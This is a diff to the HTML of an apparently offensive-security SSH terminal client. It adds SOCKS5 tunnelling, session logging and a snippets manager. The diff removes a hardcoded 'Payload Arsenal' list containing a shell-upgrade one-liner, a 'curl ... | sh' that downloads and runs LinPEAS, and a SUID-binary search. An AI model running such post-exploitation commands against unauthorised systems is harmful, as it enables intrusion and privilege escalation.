@@ -15,16 +15,15 @@
         <input type="text" id="ssh-host" placeholder="Host" />
         <input type="number" id="ssh-port" placeholder="Port" value="22" />
         <input type="password" id="ssh-pass" placeholder="Password" />
+        <input type="checkbox" id="ssh-tunnel"> <span style="color: white; font-size: 13px;">SOCKS5</span>
+        <input type="number" id="ssh-tunnel-port" value="9050" style="width: 60px;">
         <button id="ssh-connect-btn">Connect</button>
         <button id="settings-toggle-btn" title="Open Settings">⚙️</button>
       </div>
       <div id="terminal-container"></div>
       <div id="payload-drawer" class="hidden">
         <h3>Payload Arsenal</h3>
-        <ul>
-          <li data-payload="python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'">Python TTY Upgrade</li>
-          <li data-payload="curl -L http://linpeas.sh | sh">LinPEAS</li>
-          <li data-payload="find / -perm -u=s -type f 2>/dev/null">Find SUID Binaries</li>
+        <ul id="payload-drawer-list">
         </ul>
       </div>
       <div id="settings-modal" class="hidden">
@@ -37,6 +36,7 @@
             <div class="settings-sidebar">
               <button class="tab-btn active" data-tab="appearance">Appearance</button>
               <button class="tab-btn" data-tab="behavior">Behavior</button>
+              <button class="tab-btn" data-tab="snippets">Snippets</button>
             </div>
             <div class="settings-panels">
               <!-- Appearance Tab -->
@@ -81,6 +81,23 @@
                   <label for="right-click-select">Right Click Selects Word</label>
                   <input type="checkbox" id="right-click-select" checked />
                 </div>
+                <div class="setting-group checkbox-group">
+                  <label for="session-logging">Enable Session Logging</label>
+                  <input type="checkbox" id="session-logging" />
+                </div>
+              </div>
+              <!-- Snippets Tab -->
+              <div class="tab-panel" id="tab-snippets">
+                <div class="setting-group">
+                  <label for="new-snippet-name">Name</label>
+                  <input type="text" id="new-snippet-name" placeholder="e.g. Update System" />
+                </div>
+                <div class="setting-group">
+                  <label for="new-snippet-payload">Payload</label>
+                  <input type="text" id="new-snippet-payload" placeholder="e.g. sudo apt update" />
+                </div>
+                <button id="add-snippet-btn" style="margin-bottom: 10px;">Add Snippet</button>
+                <div id="snippets-manager-list" class="settings-list" style="margin-top: 15px;"></div>
               </div>
             </div>
           </div>
